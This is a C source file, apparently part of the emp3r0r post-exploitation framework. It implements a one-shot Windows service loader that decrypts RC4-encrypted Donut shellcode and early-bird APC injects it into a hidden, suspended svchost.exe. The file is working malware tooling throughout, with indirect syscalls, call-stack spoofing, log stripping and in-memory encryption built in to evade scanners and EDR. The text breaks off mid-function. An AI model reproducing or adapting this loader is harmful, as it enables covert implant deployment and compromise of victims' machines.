/*
 * staged_loader (stage) - one-shot Windows service that early-bird injects an
 * RC4-encrypted Donut sRDI blob into a sacrificial process.
 *
 * This translation unit is compiled as an in-memory-only DLL: the stager
 * executable (stager.c) carries it RC4-encrypted, reflectively maps it, and
 * calls the exported StageMain() with the RC4-encrypted blob and key. Both
 * the stage code and the shellcode reach memory only as RC4 ciphertext in
 * the stager's RCDATA resources; neither is a runnable PE on disk.
 *
 * StageMain() decrypts the blob and spawns the sacrificial process (default
 * svchost.exe) suspended, then "early birds" it: the blob is written to a
 * fresh RW region in the child, flipped to RX, and queued as a user APC on
 * the suspended primary thread. When the thread is resumed the APC runs the
 * blob before any of the sacrificial process's own code; a tiny trampoline
 * parks the primary thread afterwards so the process never reaches its own
 * (often short-lived) main routine. Donut blobs generated for emp3r0r use
 * RunThread/exit-thread, so the agent keeps running in its own thread inside
 * the parked sacrificial container.
 *
 * All injection syscalls go through indirect direct syscalls, and (on x64)
 * through the SilentMoonwalk desync spoofer so the call stack terminates in
 * kernel32!BaseThreadInitThunk instead of this module (see ../common/ntsys).
 *
 * The service is one-shot: it injects, verifies the child survived for a few
 * seconds, reports SERVICE_STOPPED and exits, leaving the sacrificial process
 * (and the agent inside it) running. Install/start/delete it with the
 * console commands below or with `sc`.
 *
 * Run from a console (i.e. StartServiceCtrlDispatcherW fails) the stager
 * acts as a small CLI, forwarding to StageMain:
 *   stager.exe --install     register the service (LocalSystem, demand start)
 *   stager.exe --uninstall   remove the service
 *   stager.exe --start       start the service
 *   stager.exe --stop        stop the service
 *   stager.exe --run         inject once in the foreground (debugging)
 *   stager.exe --selftest    decrypt blob/stage and report sizes, head/tail
 *                            hashes and syscall/SMW status (CI / smoke test)
 */
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <winsvc.h>

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include "config.h"
#include "ntsys.h"
#include "rc4.h"
#include "stage_abi.h"

#if defined(NTSYS_SMW)
#include "smw/smw.h"
#endif

/* How long to keep watching the child after resume before declaring the
 * injection successful (the blob must survive startup, not crash). build.sh
 * bakes --verify-ms into config.h; the value below is the hand-build default. */
#ifndef INJECT_VERIFY_MS
#define INJECT_VERIFY_MS 5000
#endif

static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"staged_loader" */
#ifndef STAGED_LOADER_NO_SERVICE
static SERVICE_STATUS_HANDLE g_svc_handle = NULL;
#endif
static HANDLE g_stop_event = NULL; /* signaled by the control handler       */
static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */

/* ------------------------------------------------------------------ utils */

/*
 * LOG() is the only logging path. In production builds (no -DDEBUG) it
 * compiles to nothing, so every diagnostic call site -- and its format
 * string -- vanishes from the image: the shipped binary carries no
 * descriptive text at all. Build with -DDEBUG (build.sh --debug) for
 * verbose diagnostics.
 */
/* emit_wide converts a wide string to UTF-8 bytes and writes it to f. The
 * wide stdio functions (wprintf/vfwprintf) are unreliable under the mingw-w64
 * CRT when output is redirected (they truncate after one character), so all
 * console output is routed through byte-oriented stdio instead. */
static void emit_wide(const wchar_t *s, FILE *f) {
  char mb[8192];
  int n =
      WideCharToMultiByte(CP_UTF8, 0, s, -1, mb, (int)sizeof(mb), NULL, NULL);
  if (n > 0) {
    fputs(mb, f);
  }
}

#ifdef DEBUG
static void log_msg(const wchar_t *fmt, ...) {
  wchar_t tmp[2048];
  wchar_t out[2112];
  va_list ap;

  va_start(ap, fmt);
  _vsnwprintf(tmp, 2047, fmt, ap);
  va_end(ap);
  _snwprintf(out, 2111, L"[loader] %s\n", tmp);
  emit_wide(out, stderr);
}
#define LOG(...) log_msg(__VA_ARGS__)
#else
#define LOG(...) ((void)0)
#endif

/* wprint formats a wide message and prints it to stdout (byte-oriented). */
static void wprint(const wchar_t *fmt, ...) {
  wchar_t tmp[2048];
  va_list ap;

  va_start(ap, fmt);
  _vsnwprintf(tmp, 2047, fmt, ap);
  va_end(ap);
  emit_wide(tmp, stdout);
}

/*
 * The stager hands us the RC4-encrypted blob and key it unpacked into
 * memory. They stay encrypted until an operation actually needs the blob,
 * so a memory scan of an idle stager does not reveal the shellcode.
 */
static const unsigned char *g_enc_payload = NULL;
static size_t g_enc_payload_len = 0;
static const unsigned char *g_key = NULL;
static size_t g_key_len = 0;

/*
 * decrypt_payload returns a malloc'd buffer with the RC4-decrypted shellcode.
 * The ciphertext is copied before decryption so the caller's (stager-owned)
 * blob is left untouched and can be reused by later calls.
 */
static int decrypt_payload(unsigned char **payload, size_t *payload_len) {
  if (rc4_decrypt_alloc(g_enc_payload, g_enc_payload_len, g_key, g_key_len,
                        payload, payload_len) != 0) {
    LOG(L"cannot decrypt payload (blob %zu bytes, key %zu bytes)",
        g_enc_payload_len, g_key_len);
    return -1;
  }
  return 0;
}

/* hex_byte prints one byte as lowercase hex. */
static void hex_byte(FILE *f, uint8_t b) {
  static const char hex[] = "0123456789abcdef";
  fputc(hex[b >> 4], f);
  fputc(hex[b & 0xf], f);
}

/* print_hex prints the first n bytes of buf. */
static void print_hex(FILE *f, const unsigned char *buf, size_t n) {
  size_t i;
  for (i = 0; i < n; i++) {
    hex_byte(f, buf[i]);
  }
}

/* ----------------------------------------------------------------- trampoline
 */

/*
 * build_trampoline emits, at (virtual) address `tramp_addr`, a small stub
 * that calls the blob at `blob_addr` and then parks the thread forever with
 * Sleep(INFINITE). Parking is required: in the early-bird flow the APC runs
 * on the sacrificial process's primary thread before its own entry point, so
 * if the stub returned, the process would proceed into its (short-lived) own
 * code and ExitProcess would take the agent thread down with it.
 *
 * Sleep's address is resolved in *our* process; system DLLs such as kernel32
 * share one per-boot base across processes, so the absolute address is valid
 * in the freshly spawned child as well. The blob itself runs first and
 * already resolves kernel32 APIs, so the address is definitely mapped by the
 * time the stub reaches the Sleep call.
 *
 * Returns the stub size in bytes.
 */
static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
                               uintptr_t blob_addr, uintptr_t sleep_addr) {
#ifdef _WIN64
  uint32_t rel;
  /*
   * The APC entry follows the x64 ABI (RSP % 16 == 8) and the blob must see
   * that same alignment, exactly as it would from a normal `call`. Reserve 8
   * bytes before the call so it lands aligned; the trailing Sleep then runs
   * at RSP % 16 == 0. Skipping this makes the payload enter at RSP % 16 == 0,
   * which faults prologues that use aligned SSE spills (e.g. Crystal Palace
   * PICO entry stubs).
   */
  buf[0] = 0x48; /* sub rsp, 8 */
  buf[1] = 0x83;
  buf[2] = 0xEC;
  buf[3] = 0x08;
  rel = (uint32_t)(blob_addr - (tramp_addr + 9));
  buf[4] = 0xE8; /* call rel32 -> blob */
  memcpy(buf + 5, &rel, 4);
  buf[9] = 0xB9; /* mov ecx, 0xFFFFFFFF (INFINITE) */
  memcpy(buf + 10, "\xFF\xFF\xFF\xFF", 4);
  buf[14] = 0x48; /* mov rax, imm64 (Sleep) */
  buf[15] = 0xB8;
  memcpy(buf + 16, &sleep_addr, 8);
  buf[24] = 0xFF; /* call rax */
  buf[25] = 0xD0;
  buf[26] = 0xEB; /* jmp $ (never reached: Sleep(INFINITE) blocks) */
  buf[27] = 0xFE;
  return 28;
#else /* x86 */
  uint32_t rel = (uint32_t)(blob_addr - (tramp_addr + 5));
  buf[0] = 0xE8; /* call rel32 -> blob */
  memcpy(buf + 1, &rel, 4);
  buf[5] = 0x68; /* push 0xFFFFFFFF (INFINITE; __stdcall callee pops it) */
  memcpy(buf + 6, "\xFF\xFF\xFF\xFF", 4);
  {
    uint32_t lo = (uint32_t)sleep_addr;
    buf[10] = 0xB8; /* mov eax, imm32 (Sleep) */
    memcpy(buf + 11, &lo, 4);
  }
  buf[15] = 0xFF; /* call eax */
  buf[16] = 0xD0;
  buf[17] = 0xEB; /* jmp $ */
  buf[18] = 0xFE;
  return 19;
#endif
}

/* NT syscall layer lives in core/modules/common/ntsys.{c,h}. */

/* ---- unified injection primitives: NT syscalls on x64 (ntsys), Win32 ---- */

static BOOL inj_alloc_rw(HANDLE hproc, SIZE_T total, unsigned char **out) {
  *out = NULL;
#if NTSYS_HAVE
  if (ntsys_ready()) {
    void *b = NULL;
    SIZE_T s = total;
    if (!ntsys_alloc_rw(hproc, &b, &s)) {
      return FALSE;
    }
    *out = (unsigned char *)b;
    return TRUE;
  }
#endif
  *out = VirtualAllocEx(hproc, NULL, total, MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE);
  return *out != NULL;
}

static BOOL inj_write(HANDLE hproc, void *base, const void *buf, SIZE_T len) {
#if NTSYS_HAVE
  if (ntsys_ready()) {
    return ntsys_write_mem(hproc, base, buf, len);
  }
#endif
  return WriteProcessMemory(hproc, base, buf, len, NULL) != 0;
}

static BOOL inj_protect_rx(HANDLE hproc, void *base, SIZE_T len) {
#if NTSYS_HAVE
  if (ntsys_ready()) {
    return ntsys_protect_rx(hproc, &base, &len);
  }
#endif
  {
    DWORD old = 0;
    return VirtualProtectEx(hproc, base, len, PAGE_EXECUTE_READ, &old) != 0;
  }
}

static BOOL inj_queue_apc(HANDLE hthread, void *routine) {
#if NTSYS_HAVE
  if (ntsys_ready()) {
    return ntsys_queue_apc(hthread, routine);
  }
#endif
  return QueueUserAPC(hthread, (PAPCFUNC)(ULONG_PTR)routine, 0) != 0;
}

static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
#if NTSYS_HAVE
  if (ntsys_ready()) {
    HANDLE h = NULL;
    if (ntsys_create_remote_thread(hproc, routine, &h)) {
      return h;
    }
    return NULL;
  }
#endif
  return CreateRemoteThread(hproc, NULL, 0,
                            (LPTHREAD_START_ROUTINE)(ULONG_PTR)routine, NULL, 0,
                            NULL);
}

/* ------------------------------------------------------------------ inject */

/*
 * do_inject_apc spawns the sacrificial process suspended and early-bird
 * injects the decrypted blob (QueueUserAPC). Returns NO_ERROR on success, or
 * a Win32 error code. On success the child keeps running with the agent
 * inside it. This is the default path.
 */
/* spawn_sacrificial resolves SACRIFICIAL_PROCESS and starts it suspended.
 * Fills pi on success; on failure no child handles are open. */
static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
  wchar_t sysdir[MAX_PATH];
  wchar_t sac_path[MAX_PATH];
  wchar_t cmdline[MAX_PATH * 2];
  STARTUPINFOW si;

  if (GetSystemDirectoryW(sysdir, MAX_PATH) == 0) {
    LOG(L"GetSystemDirectoryW failed: %lu", GetLastError());
    return GetLastError();
  }

  /* Bare process name -> System32; anything with a separator is a path. */
  if (wcspbrk(SACRIFICIAL_PROCESS, L"\\/:") != NULL) {
    if (wcslen(SACRIFICIAL_PROCESS) >= MAX_PATH) {
      LOG(L"SACRIFICIAL_PROCESS too long");
      return ERROR_BAD_LENGTH;
    }
    wcscpy(sac_path, SACRIFICIAL_PROCESS);
  } else {
    if (_snwprintf(sac_path, MAX_PATH, L"%s\\%s", sysdir, SACRIFICIAL_PROCESS) <
        0) {
      LOG(L"SACRIFICIAL_PROCESS too long");
      return ERROR_BAD_LENGTH;
    }
  }
  if (GetFileAttributesW(sac_path) == INVALID_FILE_ATTRIBUTES) {
    LOG(L"process not found: %s", sac_path);
    return ERROR_FILE_NOT_FOUND;
  }

  if (SACRIFICIAL_ARGS[0] != L'\0') {
    _snwprintf(cmdline, MAX_PATH * 2, L"\"%s\" %s", sac_path, SACRIFICIAL_ARGS);
  } else {
    _snwprintf(cmdline, MAX_PATH * 2, L"\"%s\"", sac_path);
  }

  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  memset(pi, 0, sizeof(*pi));

  if (!CreateProcessW(sac_path, cmdline, NULL, NULL, FALSE, CREATE_SUSPENDED,
                      NULL, NULL, &si, pi)) {
    LOG(L"CreateProcessW(%s) failed: %lu", sac_path, GetLastError());
    return GetLastError();
  }
  g_child = pi->hProcess; /* control handler can kill it on stop */
  return NO_ERROR;
}

/*
 * verify_child watches the freshly resumed child for INJECT_VERIFY_MS: an
 * early crash means the payload did not survive startup and is reported as a
 * failure. On success the child is left running on its own. The caller must
 * have closed (or NULLed) pi->hThread before calling.
 */
static DWORD verify_child(PROCESS_INFORMATION *pi) {
  DWORD i;
  DWORD err = NO_ERROR;

  for (i = 0; i < INJECT_VERIFY_MS / 100; i++) {
    DWORD code = 0;
    if (g_stop_event != NULL &&
        WaitForSingleObject(g_stop_event, 100) == WAIT_OBJECT_0) {
      LOG(L"stop requested, terminating process %lu", pi->dwProcessId);
      g_child = NULL;
      TerminateProcess(pi->hProcess, 1);
      CloseHandle(pi->hProcess);
      return ERROR_CANCELLED;
    }
    /* Always pace the loop: in console (--run) mode there is no stop event
     * to wait on, and this also caps how fast we hammer GetExitCodeProcess. */
    Sleep(100);
    if (!GetExitCodeProcess(pi->hProcess, &code)) {
      LOG(L"GetExitCodeProcess failed: %lu", GetLastError());
      err = GetLastError();
      break;
    }
    if (code != STILL_ACTIVE) {
      LOG(L"process %lu exited (code %lu) right after resume; the payload "
          L"did not survive startup",
          pi->dwProcessId, code);
      err = ERROR_PROCESS_ABORTED;
      break;
    }
  }

  /* Child death inside the verify window is a failed load, not a success. */
  g_child = NULL;
  CloseHandle(pi->hProcess);
  if (err != NO_ERROR) {
    return err;
  }
  LOG(L"payload running in process %lu", pi->dwProcessId);
  return NO_ERROR;
}

static void kill_child_cleanup(PROCESS_INFORMATION *pi) {
  g_child = NULL;
  TerminateProcess(pi->hProcess, 1);
  if (pi->hThread != NULL) {
    CloseHandle(pi->hThread);
  }
  CloseHandle(pi->hProcess);
}

/*
 * do_inject_apc spawns the sacrificial process suspended and early-bird
 * injects the decrypted blob (QueueUserAPC). Returns NO_ERROR on success, or
 * a Win32 error code. On success the child keeps running with the agent
 * inside it. This is the default path.
 */
static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
  PROCESS_INFORMATION pi;
  unsigned char tramp[32];
  size_t tramp_len, blob_off, total;
  unsigned char *base = NULL;
  unsigned char *blob_addr;
  FARPROC sleep_fn;
  DWORD err;

  err = spawn_sacrificial(&pi);
  if (err != NO_ERROR) {
    return err;
  }

  sleep_fn = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Sleep");
  if (sleep_fn == NULL) {
    LOG(L"cannot resolve kernel32!Sleep");
    err = ERROR_PROC_NOT_FOUND;
    goto fail_create;
  }

  tramp_len = build_trampoline(tramp, 0, 0, 0); /* size probe */
  blob_off = (tramp_len + 0xF) & ~(size_t)0xF;
  if (payload_len > (SIZE_T)-1 - blob_off) {
    LOG(L"payload too large");
    err = ERROR_BAD_LENGTH;
    goto fail_create;
  }
  total = blob_off + payload_len;

  /* RW first, flip to RX after the write: a permanent RWX region is an
   * obvious red flag, and the payload only needs to be executable once it
   * runs (the trampoline and blob are not self-modifying). */
  if (!inj_alloc_rw(pi.hProcess, total, &base)) {
    LOG(L"region allocation failed: %lu", GetLastError());
    err = GetLastError();
    goto fail_create;
  }

  blob_addr = base + blob_off;
  if (!inj_write(pi.hProcess, blob_addr, payload, payload_len)) {
    LOG(L"payload write failed: %lu", GetLastError());
    goto fail;
  }
  tramp_len = build_trampoline(tramp, (uintptr_t)base, (uintptr_t)blob_addr,
                               (uintptr_t)sleep_fn);
  if (!inj_write(pi.hProcess, base, tramp, tramp_len)) {
    LOG(L"trampoline write failed: %lu", GetLastError());
    goto fail;
  }
  if (!inj_protect_rx(pi.hProcess, base, total)) {
    LOG(L"protect RX failed: %lu", GetLastError());
    goto fail;
  }

  /* Early bird: run the blob as the child's first user-mode APC. */
  if (!inj_queue_apc(pi.hThread, base)) {
    LOG(L"APC queue failed: %lu", GetLastError());
    goto fail;
  }
  if (ResumeThread(pi.hThread) == (DWORD)-1) {
    LOG(L"ResumeThread failed: %lu", GetLastError());
    goto fail;
  }
  /* From here on the child runs on its own; the thread handle is no longer
   * needed and must not be closed again by the cleanup paths below. */
  CloseHandle(pi.hThread);
  pi.hThread = NULL;

  return verify_child(&pi);

fail:
  kill_child_cleanup(&pi);
  VirtualFreeEx(pi.hProcess, base, 0, MEM_RELEASE);
  return GetLastError();
fail_create:
  /* The process handle exists but no remote allocation was made yet. */
  kill_child_cleanup(&pi);
  return err;
}

/*
 * do_inject_ct is the classic CreateRemoteThread variant (Cobalt Strike
 * style): the blob is written into the suspended child and started directly
 * as a remote thread, then the primary thread is resumed. There is no
 * parked primary thread here, so the sacrificial process also runs its own
 * code afterwards - choose a sacrificial that stays alive, or the process
 * may exit right after the payload starts. Compiled in when CLASSIC_INJECT
 * is defined (build.sh --inject ct).
 */
static DWORD do_inject_ct(const unsigned char *payload, size_t payload_len) {
  PROCESS_INFORMATION pi;
  unsigned char *base = NULL;
  HANDLE remote;
  DWORD err;

  err = spawn_sacrificial(&pi);
  if (err != NO_ERROR) {
    return err;
  }

  if (!inj_alloc_rw(pi.hProcess, payload_len, &base)) {
    LOG(L"region allocation failed: %lu", GetLastError());
    err = GetLastError();
    goto fail_create;
  }
  if (!inj_write(pi.hProcess, base, payload, payload_len)) {
    LOG(L"payload write failed: %lu", GetLastError());
    goto fail;
  }
  if (!inj_protect_rx(pi.hProcess, base, payload_len)) {
    LOG(L"protect RX failed: %lu", GetLastError());
    goto fail;
  }

  remote = inj_create_thread(pi.hProcess, base);
  if (remote == NULL) {
    LOG(L"remote thread creation failed: %lu", GetLastError());
    goto fail;
  }
  CloseHandle(remote);

  if (ResumeThread(pi.hThread) == (DWORD)-1) {
    LOG(L"ResumeThread failed: %lu", GetLastError());
    goto fail;
  }
  CloseHandle(pi.hThread);
  pi.hThread = NULL;

  return verify_child(&pi);

fail:
  kill_child_cleanup(&pi);
  VirtualFreeEx(pi.hProcess, base, 0, MEM_RELEASE);
  return GetLastError();
fail_create:
  kill_child_cleanup(&pi);
  return err;
}

/* do_inject dispatches to the build-time selected injection flavor. */
static DWORD do_inject(const unsigned char *payload, size_t payload_len) {
#ifdef CLASSIC_INJECT
  /* Keep the early-bird path referenced so -Wall does not flag it as unused
   * in classic builds (both flavors stay in the tree for future builds). */
  (void)do_inject_apc;
  return do_inject_ct(payload, payload_len);
#else
  /* Mirror fix: keep the classic path referenced in early-bird builds. */
  (void)do_inject_ct;
  return do_inject_apc(payload, payload_len);
#endif
}

/* ----------------------------------------------------------------- selftest */

/*
 * selftest decrypts the embedded payload and prints a single machine-parseable
 * line so CI (and operators) can verify the resource/RC4 pipeline end to end
 * without touching a sacrificial process:
 *
 *   SELFTEST data_len=<n> key_len=<n> head=<first16hex> tail=<last16hex>
 */
static int selftest(void) {
  unsigned char *payload = NULL;
  size_t payload_len = 0;
  size_t head_n, tail_n;

  if (decrypt_payload(&payload, &payload_len) != 0) {
    return 1;
  }

  head_n = payload_len < 16 ? payload_len : 16;
  tail_n = payload_len < 16 ? payload_len : 16;
  printf("SELFTEST data_len=%zu key_len=%zu head=", payload_len, g_key_len);
  print_hex(stdout, payload, head_n);
  fputs(" tail=", stdout);
  print_hex(stdout, payload + payload_len - tail_n, tail_n);
  /* Regression signal for the SSN resolution (Zw-twin ranking): CI asserts
   * that the syscall table initialized; `ssn=none` means it failed. */
  fputs(" ssn=", stdout);
#if NTSYS_HAVE
  if (ntsys_ready()) {
    printf("%u,%u,%u,%u,%u", ntsys_ssn("NtAllocateVirtualMemory"),
           ntsys_ssn("NtWriteVirtualMemory"),
           ntsys_ssn("NtProtectVirtualMemory"), ntsys_ssn("NtQueueApcThread"),
           ntsys_ssn("NtCreateThreadEx"));
  } else {
    printf("none");
  }
#else
  printf("none");
#endif
  /*
   * SMW readiness plus a live spoofed round trip (allocate, write, protect
   * in this process). This exercises the reflective-loaded stage, the SSN
   * table and the desync spoofer end to end without touching another
   * process.
   */
  fputs(" smw=", stdout);
#if NTSYS_SMW
  printf("%d", smw_ensure_init() ? 1 : 0);
  fputs(" smw_rw=", stdout);
  {
    int rw_ok = 0;
    if (ntsys_ready() && smw_ensure_init()) {
      void *region = NULL;
      SIZE_T region_size = 0x1000;
      unsigned char probe[32];
      if (ntsys_alloc_rw(GetCurrentProcess(), &region, &region_size)) {
        memset(probe, 0x5a, sizeof(probe));
        if (ntsys_write_mem(GetCurrentProcess(), region, probe,
                            sizeof(probe))) {
          void *protect_base = region;
          SIZE_T protect_size = region_size;
          if (ntsys_protect_rx(GetCurrentProcess(), &protect_base,
                               &protect_size)) {
            rw_ok = 1;
          }
        }
        VirtualFree(region, 0, MEM_RELEASE);
      }
    }
    printf("%d", rw_ok);
  }
#else
  printf("0 smw_rw=0");
#endif
  fputc('\n', stdout);

  free(payload);
  return 0;
}

/* run_once performs a single foreground injection with the embedded blob. */
static int run_once(void) {
  unsigned char *payload = NULL;
  size_t payload_len = 0;
  DWORD err;

  if (decrypt_payload(&payload, &payload_len) != 0) {
    return 1;
  }
  err = do_inject(payload, payload_len);
  free(payload);
  if (err == NO_ERROR) {
    return 0;
  }
#ifdef DEBUG
  wprint(L"operation failed (error %lu)\n", err);
#endif
  return 1;
}

/* --------------------------------------------------------------- service */

#ifndef STAGED_LOADER_NO_SERVICE

static void report_status(DWORD state, DWORD exit_code, DWORD checkpoint,
                          DWORD wait_hint) {
  SERVICE_STATUS ss;

  if (g_svc_handle == NULL) {
    return;
  }
  memset(&ss, 0, sizeof(ss));
  ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
  ss.dwCurrentState = state;
  ss.dwControlsAccepted = (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;
  ss.dwWin32ExitCode = exit_code;
  ss.dwCheckPoint = checkpoint;
  ss.dwWaitHint = wait_hint;
  SetServiceStatus(g_svc_handle, &ss);
}

static DWORD WINAPI ctrl_handler(DWORD ctrl, DWORD evt_type, void *evt_data,
                                 void *ctx) {
  (void)evt_type;
  (void)evt_data;
  (void)ctx;

  switch (ctrl) {
  case SERVICE_CONTROL_STOP:
    report_status(SERVICE_STOP_PENDING, NO_ERROR, 1, 30000);
    /* Kill the sacrificial process and let do_inject's poll loop notice the
     * stop event / dead child and perform its own handle cleanup. We never
     * close the shared handle here (do_inject owns it) to avoid a
     * double-close race; a redundant TerminateProcess is harmless. */
    if (g_child != NULL) {
      TerminateProcess(g_child, 1);
    }
    SetEvent(g_stop_event);
    return NO_ERROR;
  case SERVICE_CONTROL_INTERROGATE:
    return NO_ERROR;
  default:
    return ERROR_CALL_NOT_IMPLEMENTED;
  }
}

static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
  unsigned char *payload = NULL;
  size_t payload_len = 0;
  DWORD err;

  (void)argc;
  (void)argv;

  g_stop_event = CreateEventW(NULL, TRUE, FALSE, NULL);
  g_svc_handle =
      RegisterServiceCtrlHandlerExW(g_service_name, ctrl_handler, NULL);
  if (g_svc_handle == NULL) {
    LOG(L"RegisterServiceCtrlHandlerExW failed: %lu", GetLastError());
    return;
  }

  report_status(SERVICE_START_PENDING, NO_ERROR, 1, 10000);

  if (decrypt_payload(&payload, &payload_len) != 0) {
    err = ERROR_RESOURCE_DATA_NOT_FOUND;
    goto out;
  }
  report_status(SERVICE_RUNNING, NO_ERROR, 0, 0);
  err = do_inject(payload, payload_len);
  free(payload);

out:
  /* One-shot: report stopped and exit. The sacrificial process keeps the
   * agent running on its own after we are gone. */
  report_status(SERVICE_STOPPED, err, 0, 0);
  if (g_stop_event != NULL) {
    CloseHandle(g_stop_event);
    g_stop_event = NULL;
  }
}

/* ------------------------------------------------------------- install CLI */

static int service_install(void) {
  SC_HANDLE scm = NULL;
  SC_HANDLE svc = NULL;
  wchar_t image[MAX_PATH];
  int ret = 1;

  if (GetModuleFileNameW(NULL, image, MAX_PATH) == 0) {
    LOG(L"GetModuleFileNameW failed: %lu", GetLastError());
    return 1;
  }

  scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
  if (scm == NULL) {
    LOG(L"OpenSCManagerW failed (need admin?): %lu", GetLastError());
    return 1;
  }
  svc =
      CreateServiceW(scm, g_service_name, g_service_name, SERVICE_ALL_ACCESS,
                     SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                     SERVICE_ERROR_NORMAL, image, NULL, NULL, NULL, NULL, NULL);
  if (svc == NULL) {
    LOG(L"CreateServiceW failed: %lu", GetLastError());
    goto out;
  }
  LOG(L"service '%s' installed (%s)", g_service_name, image);
  wprint(L"start it with: sc start %s\n", g_service_name);
  ret = 0;

out:
  if (svc != NULL) {
    CloseServiceHandle(svc);
  }
  if (scm != NULL) {
    CloseServiceHandle(scm);
  }
  return ret;
}

static int service_uninstall(void) {
  SC_HANDLE scm = NULL;
  SC_HANDLE svc = NULL;
  SERVICE_STATUS ss;
  int i;
  int ret = 1;

  scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
  if (scm == NULL) {
    LOG(L"OpenSCManagerW failed (need admin?): %lu", GetLastError());
    return 1;
  }
  svc = OpenServiceW(scm, g_service_name, SERVICE_ALL_ACCESS);
  if (svc == NULL) {
    LOG(L"OpenServiceW failed: %lu", GetLastError());
    goto out;
  }
  if (ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
    LOG(L"service stopped");
    /* Wait (up to 10 s) for the one-shot service to actually stop before
     * deleting it; DeleteService fails while the service is still running. */
    for (i = 0; i < 100; i++) {
      if (!QueryServiceStatus(svc, &ss)) {
        break;
      }
      if (ss.dwCurrentState == SERVICE_STOPPED) {
        break;
      }
      Sleep(100);
    }
  }
  if (!DeleteService(svc)) {
    LOG(L"DeleteService failed: %lu", GetLastError());
    goto out;
  }
  LOG(L"service '%s' removed", g_service_name);
  ret = 0;

out:
  if (svc != NULL) {
    CloseServiceHandle(svc);
  }
  if (scm != NULL) {
    CloseServiceHandle(scm);
  }
  return ret;
}

static int service_start_stop(int start) {
  SC_HANDLE scm = NULL;
  SC_HANDLE svc = NULL;
  SERVICE_STATUS ss;
  int ret = 1;

  scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
  if (scm == NULL) {
    LOG(L"OpenSCManagerW failed: %lu", GetLastError());
    return 1;
  }
  svc = OpenServiceW(scm, g_service_name, SERVICE_START | SERVICE_STOP);
  if (svc == NULL) {
    LOG(L"OpenServiceW failed: %lu", GetLastError());
    goto out;
  }
  if (start) {
    if (!StartServiceW(svc, 0, NULL)) {
      LOG(L"StartServiceW failed: %lu", GetLastError());
      goto out;
    }
    LOG(L"service '%s' started (one-shot: it stops after injection)",
        g_service_name);
  } else {
    if (!ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
      LOG(L"ControlService failed: %lu", GetLastError());
      goto out;
    }
    LOG(L"service '%s' stop requested", g_service_name);
  }
  ret = 0;

out:
  if (svc != NULL) {
    CloseServiceHandle(svc);
  }
  if (scm != NULL) {
    CloseServiceHandle(scm);
  }
  return ret;
}

#endif /* STAGED_LOADER_NO_SERVICE */

static void print_usage(void) {
#ifndef STAGED_LOADER_NO_SERVICE
#ifdef DEBUG
  /* Long-form help for debug/lab builds only. */
  wprint(L"staged_loader (service: %s)\n"
         L"\n"
         L"When started by the Service Control Manager this one-shot service\n"
         L"runs the embedded payload in %s and then stops itself.\n"
         L"\n"
         L"Console commands:\n"
         L"  --install      register '%s' (LocalSystem, demand start)\n"
         L"  --uninstall    remove '%s'\n"
         L"  --start        start '%s'\n"
         L"  --stop         stop '%s'\n"
         L"  --run          run once in the foreground (debugging)\n"
         L"  --selftest     decrypt embedded payload, print sizes + checksums\n"
         L"  --help         this help\n",
         g_service_name, SACRIFICIAL_PROCESS, g_service_name, g_service_name,
         g_service_name, g_service_name);
#else
  /* Production images only advertise a terse, generic command list. */
  wprint(L"usage: %s [--install] [--uninstall] [--start] [--stop] [--run] "
         L"[--selftest]\n",
         g_service_name);
#endif
#else
  /* Non-service hosts only expose the foreground commands. */
  wprint(L"usage: %s [--run] [--selftest]\n", g_service_name);
#endif
}

/* ------------------------------------------------------------------- main */

static void derive_service_name(void) {
  wchar_t *p;
  wchar_t *base;

  if (GetModuleFileNameW(NULL, g_service_name, MAX_PATH) == 0) {
    wcscpy(g_service_name, L"staged_loader");
    return;
  }
  base = g_service_name;
  for (p = g_service_name; *p != L'\0'; p++) {
    if (*p == L'\\' || *p == L'/') {
      base = p + 1;
    }
  }
  /* strip trailing ".exe" for a clean service name */
  if ((p = wcsstr(base, L".exe")) != NULL && p[4] == L'\0') {
    *p = L'\0';
  }
  /* the dispatcher/SCM talk in basename terms */
  if (base != g_service_name) {
    memmove(g_service_name, base, (wcslen(base) + 1) * sizeof(wchar_t));
  }
}

/*
 * StageMain is the stager's entry into the reflectively-mapped loader. The
 * stager owns argv and the blob/key buffers; they stay valid for the whole
 * call. argc counts the wide argv entries (argv[0] is the stager path).
 */
__declspec(dllexport) int __cdecl
StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
          size_t enc_payload_len, const unsigned char *key,
          size_t key_len) {
  int i;

  g_enc_payload = enc_payload;
  g_enc_payload_len = enc_payload_len;
  g_key = key;
  g_key_len = key_len;

  derive_service_name();

#ifndef STAGED_LOADER_NO_SERVICE
  {
    SERVICE_TABLE_ENTRYW table[2];

    /* If the SCM launched us, this blocks until the service stops. */
    memset(table, 0, sizeof(table));
    table[0].lpServiceName = g_service_name;
    table[0].lpServiceProc = service_main;
    if (StartServiceCtrlDispatcherW(table)) {
      return 0;
    }
    if (GetLastError() != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
      LOG(L"StartServiceCtrlDispatcherW failed: %lu", GetLastError());
      return 1;
    }
  }
#endif

  /* Console mode. */
  for (i = 1; i < argc; i++) {
#ifndef STAGED_LOADER_NO_SERVICE
